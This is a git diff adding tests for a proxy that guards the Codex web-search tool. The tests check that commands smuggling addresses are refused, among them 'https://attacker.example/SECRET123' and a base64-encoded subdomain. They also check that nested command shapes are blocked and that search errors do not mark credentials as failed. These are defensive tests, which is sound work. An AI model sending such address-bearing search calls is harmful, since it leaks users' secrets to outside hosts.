@@ -11,6 +11,7 @@ import path from 'node:path'
 import { makeEnv } from '../lib/env'
 import { addCred, chatgptSecret, fakeJwt, testCredCtx } from '../lib/credentials'
 import { issueProxyToken, startModelProxy, type ProxyTurnEvent } from '../../server/src/proxy/model-proxy'
+import { SEARCH_ADDRESS_NOTE } from '../../server/src/proxy/codex-path'
 import { setSetting } from '../../server/src/admin/settings'
 import { SHARED_SUBSCRIPTIONS_KEY } from '../../server/src/credentials/policy'
 import { createBroker, onUsage } from '../../server/src/credentials/broker'
@@ -211,6 +212,76 @@ describe('Codex web search (standalone web.run): cached index only, same locks a
     expect((await postSearch('openai', searchTok(K))).status).toBe(200)
     // the web tool itself passes the request filter for a turn with search
     expect((await post('openai', searchTok(K), body({ tools: undefined, input: [{ type: 'additional_tools', role: 'developer', tools: [webTool] }] }))).status).toBe(200)
+  })
+  test('open / click / find / screenshot take a result reference only: an address never goes out in a search, and the model is told to use web_fetch', async () => {
+    const tok = searchTok(K)
+    const before = seen.length
+    // as the real Codex 0.164 forwards them (recorded against a fake: it keeps ref_id as the model wrote it)
+    const addressed: [string, Record<string, unknown>][] = [
+      ['open a URL', { open: [{ ref_id: 'https://attacker.example/SECRET123', lineno: 5 }] }],
+      ['find in a URL', { find: [{ ref_id: 'https://attacker.example/x', pattern: 'secret' }] }],
+      ['screenshot of a URL', { screenshot: [{ ref_id: 'attacker.example/s.pdf', pageno: 0 }] }],
+      ['a bare host', { open: [{ ref_id: 'c2VjcmV0.attacker.example' }] }],
+      ['a search and an address in one call', { search_query: [{ q: 'debian' }], open: [{ ref_id: 'turn0search0' }, { ref_id: 'http://10.0.0.1/' }] }],
+      ['a ref that is not text', { click: [{ ref_id: 12, id: 3 }] }],
+    ]
+    for (const [label, commands] of addressed) {
+      const r = await postSearch('openai', tok, searchBody({ commands }))
+      expect(r.status, label).toBe(200)
+      expect((await r.json()).output, label).toBe(SEARCH_ADDRESS_NOTE)
+    }
+    expect(seen.length).toBe(before)
+    const reasons = (env.db.query("SELECT detail FROM audit_log WHERE action = 'proxy.refused' AND target = 'cx-ws'").all() as { detail: string }[]).map((a) => JSON.parse(a.detail).reason)
+    expect(reasons).toContain('search command open names an address, not a search result')
+    // pages of the search's own results go on
+    const ok = await postSearch('openai', tok, searchBody({ commands: { search_query: [{ q: 'debian', recency: 30, domains: ['debian.org'] }], open: [{ ref_id: 'turn0search0', lineno: 10 }], click: [{ ref_id: 'turn0fetch3', id: 17 }], find: [{ ref_id: 'turn1view0', pattern: 'trixie' }], response_length: 'short' } }))
+    expect(ok.status).toBe(200)
+    expect(seen.at(-1)!.body.commands.open).toEqual([{ ref_id: 'turn0search0', lineno: 10 }])
+  })
+  test('each command holds the shape Codex sends (flat entries, a bounded list): nothing nested rides along', async () => {
+    const tok = searchTok(K)
+    const before = seen.length
+    const refused: [string, Record<string, unknown>][] = [
+      ['a nested setting in an entry', { search_query: [{ q: 'x', settings: { external_web_access: true } }] }],
+      ['an entry that is a list', { search_query: [['x']] }],
+      ['a command that is not a list', { search_query: { q: 'x' } }],
+      ['too many entries', { search_query: Array.from({ length: 21 }, (_, i) => ({ q: 'q' + i })) }],
+      ['response_length that is not a word', { search_query: [{ q: 'x' }], response_length: { live: true } }],
+      ['a list of objects in a field', { search_query: [{ q: 'x', domains: [{ host: 'a.example' }] }] }],
+    ]
+    for (const [label, commands] of refused) {
+      const r = await postSearch('openai', tok, searchBody({ commands }))
+      expect(r.status, label).toBe(403)
+    }
+    expect(seen.length).toBe(before)
+  })
+  test('a search the model service refuses or limits fails by itself: the connection keeps its state and no refresh is started', async () => {
+    const state = (id: string) => getRow(env.db, id)!
+    // an API key the search endpoint answers 401 (a restricted key without the scope, say): not marked invalid
+    respMode = '401-old'
+    const r401 = await postSearch('openai', searchTok(K))
+    expect(r401.status).toBe(403)
+    expect(state(K)).toMatchObject({ status: 'ok', status_code: null })
+    // a ChatGPT sign-in: no refresh for a search (the next model request decides)
+    const valid = validAccess
+    validAccess = new Set()
+    try {
+      const g401 = await postSearch('chatgpt', issueProxyToken(env.db, 'cx-ws', 'alice', { credentialId: G, family: 'openai' }))
+      expect(g401.status).toBe(403)
+    } finally { validAccess = valid }
+    expect(refreshes).toEqual([])
+    expect(state(G).status).toBe('ok')
+    for (const mode of ['429-plan', '429-usage', '429-credit'] as const) {
+      respMode = mode
+      const r = await postSearch('openai', searchTok(K))
+      expect(r.status, mode).toBe(429)
+      expect(state(K), mode).toMatchObject({ status: 'ok', status_code: null, limited_until: null })
+    }
+    expect(events.filter((e) => e.type === 'credential' || e.type === 'rate_limit')).toEqual([])
+    // the same answers to a model request still mark the connection, as before
+    respMode = '429-plan'
+    expect((await post('openai', tokFor(K))).status).toBe(429)
+    expect(state(K).status).not.toBe('ok')
   })
 })
 
